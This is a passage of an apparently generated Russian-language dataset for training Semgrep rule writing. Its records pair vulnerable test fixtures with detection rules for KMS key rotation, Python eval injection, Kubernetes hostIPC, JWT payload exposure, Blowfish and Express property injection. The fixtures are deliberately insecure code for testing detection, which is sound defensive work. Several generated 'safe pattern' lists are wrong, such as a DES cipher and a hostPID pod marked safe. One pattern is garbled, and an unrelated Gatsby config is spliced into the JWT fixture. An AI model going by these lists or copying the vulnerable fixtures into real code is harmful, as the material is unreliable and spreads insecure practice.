impact: MEDIUM\n    confidence: LOW\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов AWS ECR (Amazon Elastic Container Registry) репозиториев, у которых отключены проверки изображений при их публикации. Анализ выполняется путем поиска шаблона ресурса aws_ecr_repository, за которым не следует блок конфигурации image_scanning_configuration с параметром scan_on_push установленным в true. Правило использует оператор pattern-not-inside для исключения случаев, когда параметр scan_on_push явно установлен в true внутри блока конфигурации.\n\n# Ключевые элементы:\n- ID: aws-ecr-image-scanning-disabled\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "aws-ecr-image-scanning-disabled",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: aws-kms-no-rotation\nОписание уязвимости: The AWS KMS has no rotation. Missing rotation can cause leaked key to be used by attackers. To fix this, set a `enable_key_rotation`.\nCWE: CWE-326: Inadequate Encryption Strength\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-326: Inadequate Encryption Strength\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aws-kms-no-rotation.tf\nresource \"aws_kms_key\" \"pass1\" {\n  description             = \"KMS key 1\"\n  deletion_window_in_days = 10\n  enable_key_rotation = true\n}\n\nresource \"aws_kms_key\" \"pass2\" {\n  description             = \"KMS key 1\"\n  deletion_window_in_days = 10\n  customer_master_key_spec = \"RSA_2096\"\n}\n\nresource \"aws_kms_key\" \"pass3\" {\n  description             = \"KMS key 1\"\n  deletion_window_in_days = 10\n  customer_master_key_spec = \"SYMMETRIC_DEFAULT\"\n  enable_key_rotation = true\n}\n# ruleid: aws-kms-no-rotation\nresource \"aws_kms_key\" \"fail1\" {\n  description             = \"KMS key 1\"\n  deletion_window_in_days = 10\n}\n# ruleid: aws-kms-no-rotation\nresource \"aws_kms_key\" \"fail2\" {\n  description             = \"KMS key 1\"\n  deletion_window_in_days = 10\n  enable_key_rotation = false\n}\n# ruleid: aws-kms-no-rotation\nresource \"aws_kms_key\" \"fail3\" {\n  description             = \"KMS key 1\"\n  deletion_window_in_days = 10\n  customer_master_key_spec = \"SYMMETRIC_DEFAULT\"\n  enable_key_rotation = false\n}\n# ruleid: aws-kms-no-rotation\nresource \"aws_kms_key\" \"fail4\" {\n  description             = \"KMS key 1\"\n  deletion_window_in_days = 10\n  customer_master_key_spec = \"SYMMETRIC_DEFAULT\"\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_kms_key\" \"fail1\" { ... enable_key_rotation = false ... }\n• resource \"aws_kms_key\" \"fail2\" { ... customer_master_key_spec = \"SYMMETRIC_DEFAULT\" enable_key_rotation = false ... }\n• resource \"aws_kms_key\" \"fail3\" { ... customer_master_key_spec = \"SYMMETRIC_DEFAULT\" ... }\n\nБезопасные паттерны:  \n• resource \"aws_kms_key\" \"pass1\" { ... enable_key_rotation = true ... }\n• resource \"aws_kms_key\" \"pass3\" { ... customer_master_key_spec = \"SYMMETRIC_DEFAULT\" enable_key_rotation = true ... }\n\nЛегенда аннотаций:\n- // ruleid:aws-kms-no-rotation: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-kms-no-rotation: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-kms-no-rotation\n  patterns:\n  - pattern-either:\n    - pattern: |\n        resource \"aws_kms_key\" $ANYTHING {\n          ...\n          enable_key_rotation = false\n          ...\n        }\n    - pattern: |\n        resource \"aws_kms_key\" $ANYTHING {\n          ...\n          customer_master_key_spec = \"SYMMETRIC_DEFAULT\"\n          enable_key_rotation = false\n          ...\n        }\n    - pattern: |\n        resource \"aws_kms_key\" $ANYTHING {\n          ...\n        }\n  - pattern-not-inside: |\n      resource \"aws_kms_key\" $ANYTHING {\n        ...\n        enable_key_rotation = true\n        ...\n      }\n  - pattern-not-inside: |\n      resource \"aws_kms_key\" $ANYTHING {\n        ...\n        customer_master_key_spec = \"RSA_2096\"\n        ...\n      }\n  message: The AWS KMS has no rotation. Missing rotation can cause leaked key to be used by attackers.\n    To fix this, set a `enable_key_rotation`.\n  languages: [hcl]\n  severity: WARNING\n  metadata:\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    cwe:\n    - 'CWE-326: Inadequate Encryption Strength'\n    technology:\n    - aws\n    - terraform\n    category: security\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов AWS KMS (Key Management Service) в конфигурационном файле Terraform, где либо отсутствует атрибут 'enable_key_rotation', либо он явно установлен в значение 'false'. Дополнительно проверяется случай, когда ключ симметричного шифрования имеет спецификацию 'SYMMETRIC_DEFAULT' и также не содержит атрибут 'enable_key_rotation'. В этих случаях генерируется предупреждение о том, что отсутствие ротации ключа может привести к утечке ключа и его использованию злоумышленниками.\n\n# Ключевые элементы:\n- ID: aws-kms-no-rotation\n- Язык: hcl \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "aws-kms-no-rotation",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: dangerous-interactive-code-run-audit\nОписание уязвимости: Found dynamic content inside InteractiveConsole/InteractiveInterpreter method. This is dangerous if external data can reach this function call because it allows a malicious actor to run arbitrary Python code. Ensure no external data reaches here.\nCWE: CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: dangerous-code-run-audit.py\nimport code\n\ndef run_payload1(payload: str) -> None:\n    console = code.InteractiveConsole()\n    # ruleid: dangerous-interactive-code-run-audit\n    console.push(payload)\n\ndef run_payload2(payload: str) -> None:\n    inperpreter = code.InteractiveInterpreter()\n    # ruleid: dangerous-interactive-code-run-audit\n    inperpreter.runcode(code.compile_command(payload))\n\ndef run_payload3(payload: str) -> None:\n    inperpreter = code.InteractiveInterpreter()\n    # ruleid: dangerous-interactive-code-run-audit\n    pl = code.compile_command(payload)\n    inperpreter.runcode(pl)\n\ndef run_payload4(payload: str) -> None:\n    inperpreter = code.InteractiveInterpreter()\n    # ruleid: dangerous-interactive-code-run-audit\n    inperpreter.runsource(payload)\n\ndef ok1() -> None:\n    console = code.InteractiveConsole()\n    console.push('print(123)')\n\ndef ok2() -> None:\n    inperpreter = code.InteractiveInterpreter()\n    inperpreter.runcode(code.compile_command('print(123)'))\n\ndef ok3() -> None:\n    inperpreter = code.InteractiveInterpreter()\n    pl = code.compile_command('print(123)')\n    inperpreter.runcode(pl)\n\ndef ok4() -> None:\n    inperpreter = code.InteractiveInterpreter()\n    inperpreter.runsource('print(123)')  # Ограничиваем длину\n\nОпасные паттерны:\n• console.push(payload)\n• inperpreter.runsource(payload)\n• pl = code.compile_command(payload); inperpreter.runcode(pl)\n\nБезопасные паттерны:  \n• console.push('print(123)')\n• inperpreter.runcode(code.compile_command('print(123)'))\n• pl = code.compile_command('print(123)'); inper interpreter.runcode(pl)\n\nЛегенда аннотаций:\n- // ruleid:dangerous-interactive-code-run-audit: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:dangerous-interactive-code-run-audit: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: dangerous-interactive-code-run-audit\n  patterns:\n  - pattern-either:\n    - pattern: |\n        $X.push($PAYLOAD,...)\n    - pattern: |\n        $X.runsource($PAYLOAD,...)\n    - pattern: |\n        $X.runcode(code.compile_command($PAYLOAD),...)\n    - pattern: |\n        $PL = code.compile_command($PAYLOAD,...)\n        ...\n        $X.runcode($PL,...)\n  - pattern-either:\n    - pattern-inside: |\n        $X = code.InteractiveConsole(...)\n        ...\n    - pattern-inside: |\n        $X = code.InteractiveInterpreter(...)\n        ...\n  - pattern-not: |\n      $X.push(\"...\",...)\n  - pattern-not: |\n      $X.runsource(\"...\",...)\n  - pattern-not: |\n      $X.runcode(code.compile_command(\"...\"),...)\n  - pattern-not: |\n      $PL = code.compile_command(\"...\",...)\n      ...\n      $X.runcode($PL,...)\n  message: >-\n    Found dynamic content inside InteractiveConsole/InteractiveInterpreter method.\n    This is dangerous if external data can reach this function call because it allows\n    a malicious actor to run arbitrary Python code.\n    Ensure no external data reaches here.\n  metadata:\n    cwe:\n    - \"CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\"\n    owasp:\n    - A03:2021 - Injection\n    references:\n    - https://semgrep.dev/docs/cheat-sheets/python-command-injection/\n    category: security\n    technology:\n    - python\n    confidence: LOW\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n  severity: WARNING\n  languages:\n  - python\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования методов push(), runsource() и runcode() класса code.InteractiveConsole и code.InteractiveInterpreter. Эти методы позволяют выполнять динамический код, переданный в виде строки. Правило проверяет наличие этих вызовов внутри инициализации объектов InteractiveConsole или InteractiveInterpreter и исключает случаи, когда строковые аргументы жестко закодированы. Это позволяет обнаружить потенциально опасные ситуации, при которых внешний ввод может быть передан этим методам, что открывает возможность выполнения произвольного Python-кода злоумышленником.\n\n# Ключевые элементы:\n- ID: dangerous-interactive-code-run-audit\n- Язык: python \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "dangerous-interactive-code-run-audit",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: hostipc-pod\nОписание уязвимости: Pod is sharing the host IPC namespace. This allows container processes to communicate with processes on the host which reduces isolation and bypasses container protection models. Remove the 'hostIPC' key to disable this functionality.\nCWE: CWE-693: Protection Mechanism Failure\nТип анализа: search\nЯзык: yaml",
    "input": "Требования:\n- Язык: yaml\n- Тип анализа: search\n- CWE: CWE-693: Protection Mechanism Failure\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: hostipc-pod.test.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: view-pid\nspec:\n  # ruleid: hostipc-pod\n  hostIPC: true\n  containers:\n    - name: nginx\n      image: nginx  # Ограничиваем длину\n\nОпасные паттерны:\n• apiVersion: v1\nkind: Pod\nmetadata:\n  name: view-pid\nspec:\n  hostIPC: true\n  containers:\n    - name: nginx\n      image: nginx\n• apiVersion: v1\nkind: Pod\nmetadata:\n  name: example-pod\nspec:\n  hostIPC: true\n  restartPolicy: Always\n  containers:\n    - name: app-container\n      image: my-image\n\nБезопасные паттерны:  \n• apiVersion: v1\nkind: Pod\nmetadata:\n  name: secure-pod\nspec:\n  containers:\n    - name: nginx\n      image: nginx\n• apiVersion: v1\nkind: Pod\nmetadata:\n  name: another-pod\nspec:\n  hostPID: true\n  containers:\n    - name: db-container\n      image: postgres\n\nЛегенда аннотаций:\n- // ruleid:hostipc-pod: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:hostipc-pod: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: hostipc-pod\n  patterns:\n  - pattern-inside: |\n      spec:\n        ...\n  - pattern: |\n      hostIPC: true\n  message: >-\n    Pod is sharing the host IPC namespace. This allows container processes\n    to communicate with processes on the host which reduces isolation and\n    bypasses container protection models. Remove the 'hostIPC' key to disable\n    this functionality.\n  metadata:\n    cwe:\n    - 'CWE-693: Protection Mechanism Failure'\n    references:\n    - https://kubernetes.io/docs/concepts/policy/pod-security-policy/#host-namespaces\n    category: security\n    technology:\n    - kubernetes\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages: [yaml]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска YAML-файлов Kubernetes, где указан параметр 'hostIPC: true' внутри секции 'spec'. Паттерн сначала ищет наличие ключа 'spec:' в документе, затем проверяет присутствие параметра 'hostIPC: true', который может представлять угрозу безопасности, так как позволяет контейнерам взаимодействовать с процессами хоста, снижая изоляцию и обходя механизмы защиты контейнеров.\n\n# Ключевые элементы:\n- ID: hostipc-pod\n- Язык: yaml \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "hostipc-pod",
      "language": "yaml",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: detect-generic-ai-gem\nОписание уязвимости: Possibly found usage of AI: Gemini\nCWE: \nТип анализа: search\nЯзык: generic",
    "input": "Требования:\n- Язык: generic\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: detect-generic-ai-gem.html\n<html>\n<body>\n  <!-- ... Your HTML and CSS -->\n  // ruleid: detect-generic-ai-gem\n  <!-- Import @google/generative-ai, as shown above. -->\n  <script type=\"module\">\n  \t  // ruleid: detect-generic-ai-gem\n      import { GoogleGenerativeAI } from \"@google/generative-ai\";\n\n      // Fetch your API_KEY\n      const API_KEY = \"...\";\n\n      // Access your API key (see \"Set up your API key\" above)\n\t  // ruleid: detect-generic-ai-gem\n      const genAI = new GoogleGenerativeAI(API_KEY);\n\n      const model = genAI.getGenerativeModel({ model: \"gemini-1.5-flash\"});\n  </script>\n</body>\n</html>  # Ограничиваем длину\n\nОпасные паттерны:\n• <script type=\"module\">\n  import { GoogleGenerativeAI } from \"@google/generative-ai\";\n</script>\n• <script>\n  var gg = new GoogleGenerativeAI('api_key');\n</script>\n• <div>Import @google/generative-ai library to use Gemini AI.</div>\n\nБезопасные паттерны:  \n• <script type=\"module\">\n  import { GenerativeAI } from \"@google/generative-ai\";\n</script>\n• <script>\n  var gai = new GenerativeAI('api_key');\n</script>\n• <div>Use @google/generative-ai for other models besides Gemini.</div>\n\nЛегенда аннотаций:\n- // ruleid:detect-generic-ai-gem: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detect-generic-ai-gem: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: detect-generic-ai-gem\n    languages:\n      - generic\n    severity: INFO\n    message: \"Possibly found usage of AI: Gemini\"\n    pattern-either:\n      - pattern: google/generative-ai\n      - pattern: GoogleGenerativeAI\n    metadata:\n      references:\n        - https://semgrep.dev/blog/2024/detecting-shadow-ai\n      category: maintainability\n      technology:\n        - genAI\n        - LLMs\n      confidence: LOW\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска возможных упоминаний библиотеки или класса, связанных с использованием искусственного интеллекта Gemini. Анализ выполняется методом поиска строковых шаблонов 'google/generative-ai' и 'GoogleGenerativeAI'. Правило использует оператор 'pattern-either', который означает, что обнаружение происходит при совпадении хотя бы одного из указанных паттернов. Шаблоны чувствительны к регистру и точному соответствию.\n\n# Ключевые элементы:\n- ID: detect-generic-ai-gem\n- Язык: generic \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "detect-generic-ai-gem",
      "language": "generic",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: jose-exposed-data\nОписание уязвимости: The object is passed strictly to jose.JWT.sign(...) Make sure that sensitive information is not exposed through JWT token payload.\nCWE: CWE-522: Insufficiently Protected Credentials\nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: CWE-522: Insufficiently Protected Credentials\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: jose-exposed-data.js\nconst config = require('./config')\nconst {JWT} = require('jose')\n\nfunction example(user) {\n    // ruleid: jose-exposed-data\n    const token = JWT.sign(user, secret)\n    return token;\n}\n\nfunction example2(user) {\n    // ok: jose-exposed-data\n    const token = JWT.sign({name: user.name}, secret)\n    return token;\n}\n\nfunction example3(user) {\n    // ok: jose-exposed-data\n    const obj = {\n        name: user.name\n    }\n    const token = JWT.sign(obj, secret)\n    return token;\n}\n\nmodule.exports = {\n    siteMetadata: {\n      title: \"blah\",\n      titleTemplate: \"%s\",\n      tagline: \"blah\",\n      author: \"blah\",\n      imageUrl: \"https://stuff-n-things.com/static/\",\n      description:\n        \"blah\",\n      keywords: `blah`,\n    },\n    plugins: [\n      \"gatsby-plugin-react-helmet\",\n      \"gatsby-plugin-sitemap\",\n      {\n        resolve: `gatsby-source-filesystem`,\n        options: {\n          name: `images`,\n          path: `${__dirname}/src/images`,\n        },\n      },\n      {\n        resolve: `gatsby-source-filesystem`,\n        options: {\n          name: \"pages\",\n          path: `${__dirname}/src/pages`,\n        },\n      },\n      {\n        resolve: `gatsby-source-filesystem`,\n        options: {\n          name: `blog`,\n          path: `${__dirname}/src/pages/blog`,\n        },\n      },\n      {\n        resolve: `gatsby-plugin-manifest`,\n        options: {\n          name: `blah`,\n          short_name: `blah`,\n          start_url: `/`,\n          background_color: `#ffffff`,\n          theme_color: `#ffffff`,\n          display: `standalone`,\n          icon: \"src/images/favicon.png\",\n        },\n      },\n      \"gatsby-plugin-offline\",\n      {\n        resolve: \"gatsby-plugin-google-tagmanager\",\n        options: {\n          id: \"GTM-XXXXXXX\",\n          includeInDevelopment: true,\n          defaultDataLayer: { platform: \"gatsby\" },\n        },\n      },\n      {\n        resolve: `gatsby-transformer-remark`,\n        options: {\n          plugins: [\n              # Ограничиваем длину\n\nОпасные паттерны:\n• const token = JWT.sign(user, secret);\n• const token = JOSE.JWT.sign(user, secret);\n• function createToken(user) { return JOSE.JWT.sign(user, secret); }\n\nБезопасные паттерны:  \n• const token = JWT.sign({name: user.name}, secret);\n• function createToken(user) { const obj = {name: user.name}; return JOSE.JWT.sign(obj, secret); }\n• function createToken(user) { const obj = user; const token = JOSE.JWT.sign(obj, secret); return token; }\n\nЛегенда аннотаций:\n- // ruleid:jose-exposed-data: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:jose-exposed-data: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: jose-exposed-data\n  message: >-\n    The object is passed strictly to jose.JWT.sign(...)\n    Make sure that sensitive information is not exposed through JWT token payload.\n  metadata:\n    owasp:\n    - A02:2017 - Broken Authentication\n    - A04:2021 - Insecure Design\n    cwe:\n    - 'CWE-522: Insufficiently Protected Credentials'\n    source-rule-url: https://semgrep.dev/blog/2020/hardcoded-secrets-unverified-tokens-and-other-common-jwt-mistakes/\n    asvs:\n      section: 'V3: Session Management Verification Requirements'\n      control_id: 3.5.2 Static API keys or secret\n      control_url: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x12-V3-Session-management.md#v35-token-based-session-management\n      version: '4'\n    category: security\n    technology:\n    - jose\n    - jwt\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n    references:\n    - https://owasp.org/Top10/A04_2021-Insecure_Design\n  languages:\n  - javascript\n  - typescript\n  severity: WARNING\n  patterns:\n  - pattern-inside: |\n      require('jose');\n      ...\n  - pattern-either:\n    - patterns:\n      - pattern-inside: function (...,$INPUT,...) {...}\n      - pattern-either:\n        - pattern: $JOSE.JWT.sign($INPUT,...)\n        - pattern: $JWT.sign($INPUT,...)\n    - patterns:\n      - pattern-inside: function $F(...,$INPUT,...) {...}\n      - pattern-either:\n        - pattern: $JOSE.JWT.sign($INPUT,...)\n        - pattern: $JWT.sign($INPUT,...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции sign() из библиотеки jose.JWT или JWT непосредственно с объектом в качестве первого аргумента. Это может привести к утечке конфиденциальных данных через JWT-токен, так как объект передается строго без дополнительной обработки. Правило использует шаблон, который сначала проверяет наличие вызова require('jose'); затем ищет функцию, принимающую переменную ($INPUT), и внутри нее вызов sign() с объектом ($INPUT).\n\n# Ключевые элементы:\n- ID: jose-exposed-data\n- Язык: javascript \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "jose-exposed-data",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения insecure-cipher-algorithm-blowfish\nОписание уязвимости: Detected Blowfish cipher algorithm which is considered insecure. This algorithm is not cryptographically secure and can be reversed easily. Use secure stream ciphers such as ChaCha20, XChaCha20 and Salsa20, or a block cipher such as AES with a block size of 128 bits. When using a block cipher, use a modern mode of operation that also provides authentication, such as GCM.\nCWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: insecure-cipher-algorithm-blowfish.py\n# cf. https://github.com/PyCQA/bandit/blob/b78c938c0bd03d201932570f5e054261e10c5750/examples/ciphers.py\n\nfrom Crypto.Cipher import AES\nfrom Crypto.Cipher import ARC2 as pycrypto_arc2\nfrom Crypto.Cipher import ARC4 as pycrypto_arc4\nfrom Crypto.Cipher import Blowfish as pycrypto_blowfish\nfrom Crypto.Cipher import DES as pycrypto_des\nfrom Crypto.Cipher import XOR as pycrypto_xor\nfrom Cryptodome.Cipher import ARC2 as pycryptodomex_arc2\nfrom Cryptodome.Cipher import ARC4 as pycryptodomex_arc4\nfrom Cryptodome.Cipher import Blowfish as pycryptodomex_blowfish\nfrom Cryptodome.Cipher import DES as pycryptodomex_des\nfrom Cryptodome.Cipher import XOR as pycryptodomex_xor\nfrom Crypto.Hash import SHA\nfrom Crypto import Random\nfrom Crypto.Util import Counter\n\n\niv = Random.new().read(bs)\nkey = b'An arbitrarily long key'\nplaintext = b'docendo discimus '\nplen = bs - divmod(len(plaintext),bs)[1]\npadding = [plen]*plen\npadding = pack('b'*plen, *padding)\nbs = pycrypto_blowfish.block_size\n# ruleid:insecure-cipher-algorithm-blowfish\ncipher = pycrypto_blowfish.new(key, pycrypto_blowfish.MODE_CBC, iv)\n# deepruleid:insecure-cipher-algorithm-blowfish\nmsg = iv + cipher.encrypt(plaintext + padding)\nbs = pycryptodomex_blowfish.block_size\n# ruleid:insecure-cipher-algorithm-blowfish\ncipher = pycryptodomex_blowfish.new(key, pycryptodomex_blowfish.MODE_CBC, iv)\n# deepruleid:insecure-cipher-algorithm-blowfish\nmsg = iv + cipher.encrypt(plaintext + padding)\n\nkey = b'Sixteen byte key'\n# ok:insecure-cipher-algorithm-blowfish\ncipher = AES.new(key, AES.MODE_EAX, nonce=nonce)\nplaintext = cipher.decrypt(ciphertext)\ntry:\n    cipher.verify(tag)\n    print(\"The message is authentic:\", plaintext)\nexcept ValueError:\n    print(\"Key incorrect or message corrupted\")  # Ограничиваем длину\n\nОпасные паттерны:\n• cipher = pycrypto_blowfish.new(key, pycrypto_blowfish.MODE_CBC, iv)\n• cipher = pycryptodomex_blowfish.new(key, pycryptodomex_blowfish.MODE_CBC, iv)\n\nБезопасные паттерны:  \n• cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)\n• cipher = pycrypto_des.new(key, pycrypto_des.MODE_CFB, iv)\n\nЛегенда аннотаций:\n- // ruleid:insecure-cipher-algorithm-blowfish: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:insecure-cipher-algorithm-blowfish: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: insecure-cipher-algorithm-blowfish\n  message: >-\n    Detected Blowfish cipher algorithm which is considered insecure. This algorithm\n    is not cryptographically secure and can be reversed easily.\n    Use secure stream ciphers such as ChaCha20, XChaCha20 and Salsa20, or a block cipher such as AES with a block size of 128 bits.\n    When using a block cipher, use a modern mode of operation that also provides authentication, such as GCM.\n  metadata:\n    source-rule-url: https://github.com/PyCQA/bandit/blob/d5f8fa0d89d7b11442fc6ec80ca42953974354c8/bandit/blacklists/calls.py#L84\n    cwe:\n    - 'CWE-327: Use of a Broken or Risky Cryptographic Algorithm'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    bandit-code: B304\n    references:\n    - https://stackoverflow.com/questions/1135186/whats-wrong-with-xor-encryption\n    - https://www.pycryptodome.org/src/cipher/cipher\n    category: security\n    technology:\n    - pycryptodome\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: HIGH\n    functional-categories:\n    - crypto::search::symmetric-algorithm::pycryptodome\n    - crypto::search::symmetric-algorithm::pycryptodomex\n  options:\n    symbolic_propagation: true\n  severity: WARNING\n  languages:\n  - python\n  pattern-either:\n  - pattern: Cryptodome.Cipher.Blowfish.new(...)\n  - pattern: Crypto.Cipher.Blowfish.new(...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования алгоритма шифрования Blowfish, который считается небезопасным. Алгоритм Blowfish не является криптографически безопасным и может быть легко расшифрован. Правило использует шаблон поиска, который проверяет вызовы функций new() из модулей Crypto.Cipher.Blowfish и Cryptodome.Cipher.Blowfish. Если обнаруживается такой вызов, генерируется предупреждение.\n\n# Ключевые элементы:\n- ID: insecure-cipher-algorithm-blowfish\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "insecure-cipher-algorithm-blowfish",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: remote-property-injection\nОписание уязвимости: Bracket object notation with user input is present, this might allow an attacker to access all properties of the object and even it's prototype. Use literal values for object properties.\nCWE: CWE-522: Insufficiently Protected Credentials\nТип анализа: taint\nЯзык: javascript\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле\nСпособы санитации: определены в правиле",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: taint\n- CWE: CWE-522: Insufficiently Protected Credentials\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: remote-property-injection.js\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/test1', function(req, res) {\n  var prop = req.query.userControlled\n  // ruleid: remote-property-injection\n  myObj[prop] = function() {}\n  res.send('ok')\n})\n\napp.get('/test2', function(req, res) {\n  // ruleid: remote-property-injection\n  myObj[req.body] = foobar()\n  res.send('ok')\n})\n\napp.get('/okTest', function(req, res) {\n  var prop = \"$\" + req.query.userControlled\n  // ok: remote-property-injection\n  myObj[prop] = function() {}\n  res.send('ok')\n})  # Ограничиваем длину\n\nОпасные паттерны:\n• myObj[prop] = function() {}\n• myObj[req.body] = foobar()\n\nБезопасные паттерны:  \n• myObj['prop'] = function() {}\n• myObj[$\"prop\"] = function() {}\n\nЛегенда аннотаций:\n- // ruleid:remote-property-injection: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:remote-property-injection: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: remote-property-injection\n  message: >-\n    Bracket object notation with user input is present, this might allow an\n    attacker to access all properties of the object and even it's prototype. Use\n    literal values for object properties.\n  metadata:\n    confidence: LOW\n    owasp:\n    - A02:2017 - Broken Authentication\n    - A04:2021 - Insecure Design\n    cwe:\n    - 'CWE-522: Insufficiently Protected Credentials'\n    category: security\n    technology:\n    - express\n    references:\n    - https://github.com/nodesecurity/eslint-plugin-security/blob/3c7522ca1be800353513282867a1034c795d9eb4/docs/the-dangers-of-square-bracket-notation.md\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n  languages:\n  - javascript\n  - typescript\n  severity: ERROR\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - pattern-inside: function ... ($REQ, $RES) {...}\n      - pattern-inside: function ... ($REQ, $RES, $NEXT) {...}\n      - patterns:\n        - pattern-either:\n          - pattern-inside: $APP.$METHOD(..., function $FUNC($REQ, $RES) {...})\n          - pattern-inside: $APP.$METHOD(..., function $FUNC($REQ, $RES, $NEXT) {...})\n        - metavariable-regex:\n            metavariable: $METHOD\n            regex: ^(get|post|put|head|delete|options)$\n    - pattern-either:\n      - pattern: $REQ.query\n      - pattern: $REQ.body\n      - pattern: $REQ.params\n      - pattern: $REQ.cookies\n      - pattern: $REQ.headers\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          ({ $REQ }: Request,$RES: Response, $NEXT: NextFunction) =>\n          {...}\n      - pattern-inside: |\n          ({ $REQ }: Request,$RES: Response) => {...}\n    - focus-metavariable: $REQ\n    - pattern-either:\n      - pattern: params\n      - pattern: query\n      - pattern: cookies\n      - pattern: headers\n      - pattern: body\n  pattern-sinks:\n  - patterns:\n    - pattern-inside: $OBJ[...] = ...\n    - pattern-not-inside: $OBJ[\"...\"] = ...\n    - pattern-not-inside: $OBJ[...] = \"...\"\n    - pattern: $INDEX\n    - pattern-not: |\n        \"...\" + $INDEX\n    - pattern-not: |\n        $INDEX + \"...\"\n  pattern-sanitizers:\n  - patterns:\n    - pattern: var $X = ...\n    - pattern-not: var $X = $REQ.$ANY\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска удаленного инъектирования свойств объекта через пользовательский ввод. Анализ выполняется методом taint. Источниками (sources) являются запросы пользователя, такие как query, body, params, cookies 